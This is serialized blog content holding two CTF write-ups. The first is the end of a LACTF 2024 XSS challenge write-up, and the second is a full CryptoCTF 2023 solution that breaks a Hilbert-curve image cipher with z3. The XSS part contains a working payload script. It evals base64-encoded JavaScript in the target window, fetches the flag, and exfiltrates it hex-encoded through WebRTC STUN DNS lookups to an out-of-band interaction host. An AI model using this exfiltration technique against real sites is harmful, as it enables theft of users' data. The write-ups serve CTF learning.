href=\"https://blog.antoniusblock.net/posts/golfjail/\">https://blog.antoniusblock.net/posts/golfjail/\u003C/a>\u003C/p>\n\u003Cp>You can send the same request, but modifying the data to the request response, and collect the response in the DNS query.\nThis is the payload script I used during the CTF.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">innerpayload \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\"\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">window.onload = () => {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">fetch('https://ctf-wiki.chall.lac.tf/flag', {method: \"POST\"}).then(r => r.text()).then(r => {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">pc=new RTCPeerConnection({\"iceServers\":[{\"urls\":[\"stun:\"+r.split(\"\").map(x=>x.charCodeAt(0).toString(16)).join(\"\").substr(0, 62)+\".\"+\"zlamrbukykhbdngfjbuh29ofd2v5k39qo.oast.fun\"]}]});\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">pc.createOffer({offerToReceiveAudio:1}).then(o=>pc.setLocalDescription(o));\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">})\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">\"\"\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.strip()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">payload \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">f\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\"\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">w = window.open(\"https://ctf-wiki.chall.lac.tf/\");\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">w.eval(atob('\u003C/span>\u003Cspan style=\"--0:#79B8FF\">{\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">b64encode(innerpayload.encode()).decode()\u003C/span>\u003Cspan style=\"--0:#79B8FF\">}\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">\"\"\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.strip()\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"innerpayload = &#x22;&#x22;&#x22;window.onload = () => {    fetch(&#x27;https://ctf-wiki.chall.lac.tf/flag&#x27;, {method: &#x22;POST&#x22;}).then(r => r.text()).then(r => {        pc=new RTCPeerConnection({&#x22;iceServers&#x22;:[{&#x22;urls&#x22;:[&#x22;stun:&#x22;+r.split(&#x22;&#x22;).map(x=>x.charCodeAt(0).toString(16)).join(&#x22;&#x22;).substr(0, 62)+&#x22;.&#x22;+&#x22;zlamrbukykhbdngfjbuh29ofd2v5k39qo.oast.fun&#x22;]}]});        pc.createOffer({offerToReceiveAudio:1}).then(o=>pc.setLocalDescription(o));    })}&#x22;&#x22;&#x22;.strip()payload = f&#x22;&#x22;&#x22;w = window.open(&#x22;https://ctf-wiki.chall.lac.tf/&#x22;);w.eval(atob(&#x27;{b64encode(innerpayload.encode()).decode()}&#x27;))&#x22;&#x22;&#x22;.strip()\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>And you will get a response like this, which afterwards you can hex decode the subdomain to determine the flag!\n\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;./image-5.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>But yeah there fetch from the cookieless CSPless page is alot more straightforward lol. In the words of the author himself:\n\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;./image-6.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\u003C/p>",{"headings":79,"localImagePaths":93,"remoteImagePaths":94,"frontmatter":95,"imagePaths":98},[80,83,84,85,89,90],{"depth":34,"slug":81,"text":82},"ctf-wiki--38-solves","ctf-wiki | 38 solves",{"depth":38,"slug":39,"text":40},{"depth":38,"slug":42,"text":43},{"depth":86,"slug":87,"text":88},3,"xss-on-window-with-cookies","XSS on window with cookies",{"depth":38,"slug":45,"text":46},{"depth":38,"slug":91,"text":92},"additional-notes","Additional Notes",[69,70,71,72,73,74],[],{"title":57,"date":96,"tags":97},["Date","2024-03-01T01:58:35.000Z"],[60,61,62,63,64,65,22],[69,70,71,72,73,74],"LACTF-2024-ctf-wiki/index.md","cryptoctf-2023-writeup-bertrand",{"id":100,"data":102,"body":111,"filePath":112,"assetImports":113,"digest":116,"rendered":117,"legacyId":133},{"title":103,"date":104,"tags":105},"CryptoCTF 2023: Bertrand - Breaking Image Encryption with Hilbert Curves and Z3",["Date","2023-07-10T05:18:14.000Z"],[106,107,108,21,22,109,110],"cryptography","z3-solver","hilbert-curves","image-encryption","constraint-solving","# **Bertrand (180 pts) 21 solves**\n\nBertrand stands tall as the epitome of security, safeguarding images with an impenetrable fortress of encryption that leaves no room for compromise.\n\n## **Description**\n\nWe are given an image `enc.png` and a python script called `Bertrand.py`. The image looks like this.\n\n![Encoded image](enc.png)\n\nAnd this is the raw `Bertrand.py` script.\n\n```py\n#!/usr/bin/env python3\nimport sys\nimport math\nimport functools\nfrom PIL import Image\nfrom random import randint\nimport string\nfrom secret import flag, key, n\n\ndef pad(s, l):\n        while len(s) \u003C l:\n                s += string.printable[randint(0, 61)]\n        return s\n\ndef sox(n, d):\n        x, y, t = 0, 0, d\n        for s in range(n - 1):\n                u = 1 & t // 2\n                v = 1 & t ^ u\n                x, y = spin(2**s, x, y, u, v)\n                x += 2**s * u\n                y += 2**s * v\n                t = t // 4\n        return x, y\n\ndef spin(n, x, y, u, v):\n        if v == 0:\n                if u == 1:\n                        x = n - 1 - x\n                        y = n - 1 - y\n                x, y = y, x\n        return x, y\n\ndef encrypt(msg, key, n):\n        _msg = pad(msg, n ** 2)\n        _msg, _key = [ord(_) for _ in _msg], [ord(_) for _ in key]\n        img = Image.new('RGBA', (n, n), 'darkblue')\n        pix = img.load()\n\n        for _ in range(len(key)):\n                w = len(_key)\n                h = n**2 // w + 1\n                arr = [[_msg[w*x + y] if w*x + y \u003C n**2 else None for x in range(h)] for y in range(w)]\n                _conf = sorted([(_key[i], i) for i in range(w)])\n                _marshal = [arr[_conf[i][1]] for i in range(w)]\n                _msg = functools.reduce(lambda a, r: a + _marshal[r], range(w), [])\n                _msg = list(filter(lambda x: x is not None, _msg))\n                _msg = [(_msg[_] + _key[_ % w]) % 256 for _ in range(n**2)]\n\n        for d in range(n**2):\n                x, y = sox(n, d)\n                pix[x,y] = (_msg[d], _msg[d], _msg[d])\n        keysum = sum(_key) if w > 0 else 0\n        orient = keysum % 4\n        img = img.rotate(90*orient)\n        return img\n\nassert len(key) == 3\nimg = encrypt(flag, key, n)\nimg.save('enc.png')\n```\n\nThere seems to be alot going in this script. First off, we can see that there is a flag and a key. The key is some string of length 3, and the flag is then \"encrypted\" with this key and saved to an image called `enc.png`.\n\nThe encrypt function first pads the message to be of length `n**2`. We can later see from the actual image creation and by just guessing, that `n**2` notes the number of pixels in the image. Meaning since the image is `256 x 256` pixels, then `n = 256`.\n\n```py\n_msg = pad(msg, n ** 2)\n```\n\nThe pad function just fills the message with a bunch of random printable characters, pretty straightforward.\n\n```py\ndef pad(s, l):\n        while len(s) \u003C l:\n                s += string.printable[randint(0, 61)]\n        return s\n```\n\nIt then operates on the integer values of the message and the key, as a list. We can note that `_msg` will be of length `n**2 = 256**2` and `_key` is of length `3`.\n\n```py\n_msg, _key = [ord(_) for _ in _msg], [ord(_) for _ in key]\n```\n\nAs for the actual encryption, we seem to perform 3 rounds involving grouping certain characters, permuting the group, recombining the groups, then performing a simple `vignere` cipher.\n\nFirst we get group the charecters by their index equal to `0 (mod 3)`, `1 (mod 3)` and `2 (mod 3)`.\n\n```py\narr = [[_msg[w*x + y] if w*x + y \u003C n**2 else None for x in range(h)] for y in range(w)]\n```\n\nWe then permute these groups based on the ascii order of the key.\n\n```py\n_conf = sorted([(_key[i], i) for i in range(w)])\n_marshal = [arr[_conf[i][1]] for i in range(w)]\n_msg = functools.reduce(lambda a, r: a + _marshal[r], range(w), [])\n_msg = list(filter(lambda x: x is not None, _msg))\n```\n\nAnd a vignere cipher is then performed on the modified message and the key.\n\n```py\n_msg = [(_msg[_] + _key[_ % w]) % 256 for _ in range(n**2)]\n```\n\nFinally, the message is placed as the (r, g, b) value of each pixel in the image based on the `sox()` function, and the image is rotated some amount based on the key.\n\n```py\nfor d in range(n**2):\n        x, y = sox(n, d)\n        pix[x,y] = (_msg[d], _msg[d], _msg[d])\nkeysum = sum(_key) if w > 0 else 0\norient = keysum % 4\nimg = img.rotate(90*orient)\nreturn img\n```\n\n## **Solution**\n\nWe can eliminate a few parts of the code and notice a few important and useful aspects of this encryption in order to simplify the solving process.\n\nFirst, since the image is rotated some amount, but the amount is always a multiple of `90`, we simply ignore that and later try all 4 possible rotations of the `enc.png` image.\n\nNext, what is the `sox` function? I had no idea what the code was trying to do, so instead I decided to draw it.\n\n```py\ndef sox(n, d):\n\tx, y, t = 0, 0, d\n\tfor s in range(n - 1):\n\t\tu = 1 & t // 2\n\t\tv = 1 & t ^ u\n\t\tx, y = spin(2**s, x, y, u, v)\n\t\tx += 2**s * u\n\t\ty += 2**s * v\n\t\tt = t // 4\n\treturn x, y\n\ndef spin(n, x, y, u, v):\n\tif v == 0:\n\t\tif u == 1:\n\t\t\tx = n - 1 - x\n\t\t\ty = n - 1 - y\n\t\tx, y = y, x\n\treturn x, y\n\nn = 256\ndef gen():\n    for i in range(n**2):\n        yield sox(n, i)\n\nimport turtle\n\ndef draw_path(_, square_size):\n    screen = turtle.Screen()\n    screen.setup(800, 800)\n\n    turtle.penup()\n    turtle.speed(0)\n\n    for point in gen():\n        x = point[0] * square_size + square_size / 2\n        y = point[1] * square_size + square_size / 2\n\n        off = 10 * square_size\n        turtle.goto(x - off, y - off)\n        turtle.pendown()\n        turtle.dot(2)\n\n    turtle.hideturtle()\n    turtle.done()\n\ndraw_path(..., 4)\n```\n\nIt immediately becomes quite clear that it's a Hilbert curve, a 2d space filling curve, or a unique map from a number to a 2d point. The main usefulness of this knowledge is that we can assume the image pixels have a one-to-one (therefore invertable) mapping to the message.\n\n![turtle](image.png)\n\nThe next observation is that the positions of bits in the initial message, and the final message will always be the same **if** the confusion permutation is the same. This is clear since the ascii ordering of the key is the only thing that affects the order of the bits. The operations otherwise will be the same regardless of the message.\n\nFinally, we know that the same index of the key will always affect the same character of the message in each round of the encryption. This with the above information tells us that we can do a known plaintext attack to figure out the original message. We can test each 6 possible permutations and 4 possible image rotations to try and recover the key.\n\nTo figure out how the confusion array and key affect an input, I modified the encrypt function like so.\n\n```py\ndef do(n, msg, key, sl=None):\n\t_msg = padd(msg, n**2, '\\0')\n\t_msg, _key = [ord(_) for _ in _msg], [ord(_) for _ in key]\n\tfor _ in range(len(key)):\n\t\tw = len(_key)\n\t\th = n**2 // w + 1\n\t\tarr = [[_msg[w*x + y] if w*x + y \u003C n**2 else None for x in range(h)] for y in range(w)]\n\n\t\tif not sl:\n\t\t\t_conf = sorted([(_key[i], i) for i in range(w)])\n\t\telse:\n\t\t\t_conf = sorted([(_key[i], i, sl[i]) for i in range(w)], key=lambda x: x[2])\n\n\t\t_marshal = [arr[_conf[i][1]] for i in range(w)]\n\t\t_msg = functools.reduce(lambda a, r: a + _marshal[r], range(w), [])\n\t\t_msg = list(filter(lambda x: x is not None, _msg))\n\t\t_msg = [(_msg[_] + _key[_ % w]) % 256 for _ in range(n**2)]\n\n\treturn _msg\n```\n\nThis can then be used like this to get alot of information needed to solve a particular permutation case.\n\n```py\nn = 256\nmsg = 'ABCDE'\n\nTEMP = '\\1\\2\\3'\nbaseline = do(n, msg, '\\0\\0\\0', TEMP)\nbase = []\nl = []\nfor i, v in enumerate(baseline):\n\tif v > 1:\n\t\tbase.append((i, chr(v)))\n\t\tl.append(i)\nprint(base)\nprint(l)\nprint('------------------------')\ndiffs = []\n\nfor key in ['\\x00\\x00\\x00', '\\x00\\x00\\x01', '\\x00\\x01\\x00', '\\x01\\x00\\x00']:\n\tn = 256\n\tmsg = 'CCTF{'\n\n\tbaseline = do(n, msg, key, TEMP)\n\tidk = [baseline[i] for i in l]\n\tprint(idk)\n\n\tdiffs.append(idk)\n\nfor p, f in zip(diffs, [diffs[0]]*len(diffs)):\n\tprint([p[i] - f[i] for i in range(len(p))])\n\n```\n\n```console\nabhi@abhi-omen:~/CryptoCTF/bert/Bertrand$ python solve.py\n[(0, 'A'), (7282, 'D'), (19418, 'C'), (24273, 'B'), (31555, 'E')]\n[0, 7282, 19418, 24273, 31555]\n------------------------\n[67, 70, 84, 67, 123]\n[67, 70, 86, 67, 123]\n[67, 72, 84, 68, 126]\n[70, 71, 85, 69, 123]\n[0, 0, 0, 0, 0]\n[0, 0, 2, 0, 0]\n[0, 2, 0, 1, 3]\n[3, 1, 1, 2, 0]\n```\n\nEach line of this output gives us information to figure out how to decode the key. `TEMP` is the current key permutation we are assuming the key has. So `TEMP = '\\1\\2\\3'` assumes the permutation `123`.\n\nThe first line gives us the ordering of how the first 5 characters of the message will be in the final encrypted message. The second line tells us which indexes the first 5 message characters will be. We then print the encryption for the flags `\\0\\0\\0`, `\\0\\0\\1`, `\\0\\1\\0`, `\\1\\0\\0`. `000` is the baseline. This will perform no encryption on the flag since it will add 0 every round. The next 3 keys will show us how each character of the key will affect each character of the encrypted message. This will give us a series of linear equations for key character of the key. For example, the above permutations map to,\n\n```py\n# [0, 0, 2, 0, 0]\n# [0, 2, 0, 1, 3]\n# [3, 1, 1, 2, 0]\n\ndef m0_shift_back(a):\n\tshift = [0, 3, 2, 1, 4]\n\treturn [a[s] for s in shift]\n\ndef solve_key_0(ct_fixed, pt):\n\tprint(pt)\n\tprint(ct_fixed)\n\n\tsolver = Solver()\n\tvars = [Int(f'k_{x}') for x in range(3)]\n\tk0, k1, k2 = vars\n\n\tN = 256\n\tsolver.add(k0 >= 0, k1 >= 0, k2 >= 0)\n\tsolver.add(k0 \u003C 128, k1 \u003C 128, k2 \u003C 128)\n\tsolver.add(ct_fixed[0] == (pt[0] + 3*k2) % N)\n\tsolver.add(ct_fixed[1] == (pt[1] + k1 + 2*k2) % N)\n\tsolver.add(ct_fixed[2] == (pt[2] + 2*k0 + k2) % N)\n\tsolver.add(ct_fixed[3] == (pt[3] + 2*k1 + k2) % N)\n\tsolver.add(ct_fixed[4] == (pt[4] + 3*k1) % N)\n\n\tprint(solver.check())\n\tassert solver.check() == sat\n\tm = solver.model()\n\tprint(m)\n\n\tprint(\"\".join(chr(m[x].as_long()) for x in reversed(vars)))\n```\n\nI had then created the `shift_back` function, which reverses the order of the message characters to match the order of the original known plaintext flag header. The `solve_key` function then simply puts those conditions into z3 to find a valid flag.\n\nEach permutation has its own unique `solve_key` function, which I wrote using z3. I bruteforced this for each permutation, eventually I got a success with permutation `312` and rotation `90deg`.\n\n```py\nn = 256\ndef gen_hilbert_table():\n\tm = {}\n\tfor i in range(n**2):\n\t\tt = sox(n, i)\n\t\tm[t] = i\n\n\treturn m\n\n# this takes a bit\ntable = gen_hilbert_table\n\nfrom PIL import Image\n\nimg = Image.open(\"enc.png\")\nimg = img.rotate(90)\npix = img.load()\n\n_msg = [0 for _ in range(n**2)]\n\nfor (x, y), v in table.items():\n\t_msg[v] = pix[x, y][0]\n\nl = [4854, 14563, 31553, 43690, 55826]\nmsg = 'CCTF{'\n\nheader = [_msg[i] for i in l]\nprint(header)\n\nfrom shift_solvers import solve_key_4, m4_shift_back\ns = solve_key_4(m4_shift_back(header), [ord(x) for x in msg])\n\nimg.close()\n```\n\nWhich finds 2 possible keys,\n\n```py\n[k_0 = 89, k_1 = 179, k_2 = 107]\nk³Y\n[k_0 = 89, k_2 = 107, k_1 = 51]\nk3Y\n```\n\nI assumed the key was the lattter, and now continued to the final state of solving, actually decrypting the message. While it seems doable to work backwards and reverse the encrypted message with the key, I instead just used z3 to have it solve for the entire message. The solver is essentially the same as the `Bertrand.py` code, but uses a z3 Int array as the initial message. We then put ascii conditions and ensuring that the final created message is the same as the that in the image.\n\n```py\nimport functools\nfrom PIL import Image\nfrom z3 import *\n\nkey = \"k3Y\"\nn = 256\n\ndef sox(n, d):\n\tx, y, t = 0, 0, d\n\tfor s in range(n - 1):\n\t\tu = 1 & t // 2\n\t\tv = 1 & t ^ u\n\t\tx, y = spin(2**s, x, y, u, v)\n\t\tx += 2**s * u\n\t\ty += 2**s * v\n\t\tt = t // 4\n\treturn x, y\n\ndef spin(n, x, y, u, v):\n\tif v == 0:\n\t\tif u == 1:\n\t\t\tx = n - 1 - x\n\t\t\ty = n - 1 - y\n\t\tx, y = y, x\n\treturn x, y\n\nimport pickle\n\nwith open(\"hilbert.json\", 'rb') as f:\n\ttable = pickle.load(f)\n\nbuf = [Int(f\"F_{i}\") for i in range(n**2)]\ndef encrypt(_, key, n):\n\t_msg = buf\n\t_key = [ord(_) for _ in key]\n\n\timg = Image.open(\"enc.png\")\n\timg = img.rotate(90)\n\tpix = img.load()\n\n\tactual_msg = [0 for _ in range(n**2)]\n\n\tfor (x, y), v in table.items():\n\t\tactual_msg[v] = pix[x, y][0]\n\n\tfor _ in range(len(key)):\n\t\tw = len(_key)\n\t\th = n**2 // w + 1\n\t\tarr = [[_msg[w*x + y] if w*x + y \u003C n**2 else None for x in range(h)] for y in range(w)]\n\t\t_conf = sorted([(_key[i], i) for i in range(w)])\n\t\t_marshal = [arr[_conf[i][1]] for i in range(w)]\n\t\t_msg = functools.reduce(lambda a, r: a + _marshal[r], range(w), [])\n\t\t_msg = list(filter(lambda x: x is not None, _msg))\n\n\t\t_msg = [(_msg[_] + _key[_ % w]) % 256 for _ in range(n**2)]\n\n\t\t# new z3 solve\n\t\tsolver = Solver()\n\n\t\tfor sym, actual in zip(_msg, actual_msg):\n\t\t\tsolver.add(sym == actual)\n\n\t\tfor sym in buf:\n\t\t\tsolver.add(sym > 32)\n\t\t\tsolver.add(sym \u003C 127)\n\n\treturn solver\n\nprint(\"BUILDING EQUATION\")\nsolver = encrypt(None, key, n)\n\nprint(\"SOLVING FOR SATISFYING FLAG\")\nif solver.check() == sat:\n\tm = solver.model()\n\tprint(''.join(chr(m[b].as_long()) for b in buf))\n```\n\nWhich prints the entire message including the padding. But the flag is visible at the very start.\n\n```console\nabhi@abhi-omen:~/CryptoCTF/bert/Bertrand$ python sym.py\nBUILDING EQUATION\nSOLVING FOR SATISFYING FLAG\nCCTF{3nCrypTioN_8Y_c0lUmn4R_7rAnSp05it!On!}9BB5bgJN8YNH2kRMynPqDmygUHsNCOoYAfn865iLVDKUBQhNuVfnQK65pc769LoQjwXtBKlRxaJTehEWKAp1OvHLTP4wUH8tCX9Zs5mqqChG630Qal0kHL3WWMqRDwrryfpvotCkIjcTjkM3mDueCx1FSdu228nJWGU4krYAZQc9seuVPo7L9LBDElbVtMQLh1ZpC5dq16HnLnjBAwKJvwfR3qLzAsa2GjlpWWM5JPBpCcCrSidyCn5vulsbbrFGqAQAJjM5MKy5L1OsoP5b7NKrTepFZbLXirpPuJZMyR8X39Fzn67hQx9xpJAhNKr12Sh9i1QDd1AHAYh55VHltHw6FgW2x1bUBewTbm1u1x291iLml3uIy1swLisxWGbqTlUOQYrcZwYn9kN2ygm2ZFdZo5LW7ekJTPo9wdY5Bd5ohZRBUwIQoMzJf2yRYd3cLOacb8cv15QeCPNbpsRe0b67HygShYqrZJBsloaoDr0Tktz89IYRUOvJU5hTII2XYBNLfGBfuurqVcRdRce33lJ3fPHzgZ5HBEubxRzjJB0kt8BEaXwrvALrZwq32ajy62QbEWvBHMfZxXOJfs5NiJXHDorFq94HBgjCgOyoKxi6pSS82QqyeNADTzmKpLWT2MeltOLVRr8cU0R0oL0otiuvmKkGZaAjUuPpIWK75K6WdIr4ocakkqw2ChL64f3wkTXid3DZE5Xj31ybAY9JgVQsFKRaO9GKxne3oy3xQEF3jBNBaupv2ZIuawWs4zJDvieXPMAmNqi6JYvQtUeMx2PpD15O6H9Ba6jkUuzd4mS8Dd1FFU3jHDbxdRfSkC2cIhQX6cYHAu9HYMVyemUQvjPzLsutZjQMDkwpdDl5XNvlhtyZGhGAvi9sDyTVR7XcWuPDaHBr8ixRQKH9uk5n1wUhiMaJ4IVtX7b1dlsz4JpjKMmfngoSfgMBCo8C1IrCW4kiwzc2ZU2oEccaXr4roZDqPqdDnL3HDx3EhgZpewXtSic1OFBOxDx0ApnX7u9kEOUC2LwLhJ2X1xaGk5hcQxJXH8fbyjbrsuKVmCdoCywxAUxAcC02p7ObCTrAPiTWuP7Wg5IC6imadgp3J8iCx6TowUQoVyaMV8LDiNe2RJkcEWOCtg4xxziNED5uHTgNlwHuHSa5mh12FJS39RBfDrZdokyrIdmPSuf6K1KWfk3N8HAKUypzWFlxzjdMdcU4kGSzcedFA97uQoZoI6bk1xsGaYnK0zMkjycs4qKfk0Ml7Si3OgR7kcb6muZG65zSG0LnxmX8xO1k1hODIitSsadFbpI6F1uAqy4HLWUuO5pqwudiM7AHZWnqYx4f30TBLZD29iQ4n9W48TTIKPLDE3KvAZ0DpQVcCqfsMEc68eauEMziZIUoOi3RsQF9jUsTSmL20qSnRQNtstvyNgeTB8b0v8NPyghbW31A3BKFIUDxfsihukFzBW1KaoXsSUBD9OqqDMANaMSLanJX0D2toNZNzO1ULx1WJ5nGfGJN2Uyp9bOkqLBIsJwHmc4g9pPOGgAtb6fI5DeweuVkg6e21FJ9HKEhUwcFJuMclHc59K7JliWr0hjNTbAypIR49oOAqgd7nGTYG5gujcDmQ3fGCwrST0qli4FC1nlOHzXMAypgpNq8XjE7vpMcka6MnlFRhkwD9JED4tUWUOAG6B9y1P3sX8bDFXtRtuAQER7y7EWlKxzYW0XjyHsLiPQceC62qUza9ebpguUprplVTnI8UO3mIYkl41uBDO81ftGyb7nQGjnQ70oKRzxfoN5te7yGfEIIyHWhywo2n8WL5k2s5sDHIbH181tp6TBUwiBwqc5xRmm2Mxv4y1PhMcOCQBVDcCGpgjohcxD5bsBn6PgtpcLGXUdCrX1X0vOmnrTMxzU1rsv1hLtstJAaqDdKdFElXVMHTD2q0xfNJr0plSjtedLpgxXD7oZX5fkFW3bQSWU7bBT1bqFbjGjVgiQ3U0AhAflakGxTzHRIBb95zJD4KJqAZ8Dc2qPz7Ac9uxoigvXRDQ8wMma2pCLXolcbx0vbUzMTBlIApluWPAee9fI7LAtG2C3UCj3sXo39GSqQWpwSqewXjJUXDeDECSDDEwGVOPdQFJmr34f15Pk...\n```\n\n---\n\n## Flag\n\n```\nCCTF{3nCrypTioN_8Y_c0lUmn4R_7rAnSp05it!On!}\n```","src/content/blog/CryptoCTF-2023-Writeup-Bertrand/index.md",[114,115],"enc.png","image.png","81e98d046d4f91b3",{"html":118,"metadata":119},"\u003Ch1 id=\"bertrand-180-pts-21-solves\">\u003Ca href=\"#bertrand-180-pts-21-solves\">\u003Cstrong>Bertrand (180 pts) 21 solves\u003C/strong>\u003C/a>\u003C/h1>\n\u003Cp>Bertrand stands tall as the epitome of security, safeguarding images with an impenetrable fortress of encryption that leaves no room for compromise.\u003C/p>\n\u003Ch2 id=\"description\">\u003Ca href=\"#description\">\u003Cstrong>Description\u003C/strong>\u003C/a>\u003C/h2>\n\u003Cp>We are given an image \u003Ccode>enc.png\u003C/code> and a python script called \u003Ccode>Bertrand.py\u003C/code>. The image looks like this.\u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;enc.png&#x22;,&#x22;alt&#x22;:&#x22;Encoded image&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>And this is the raw \u003Ccode>Bertrand.py\u003C/code> script.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Clink rel=\"stylesheet\" href=\"/_astro/ec.zgx9u.css\">\u003Cscript type=\"module\" src=\"/_astro/ec.p1z7b.js\">\u003C/script>\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#99A0A6\">#!/usr/bin/env python3\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> sys\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> math\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> functools\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">PIL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> Image\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> random \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> randint\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> string\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> secret \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> flag, key, n\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">pad\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(s, l):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">while\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(s) \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> l:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">s \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> 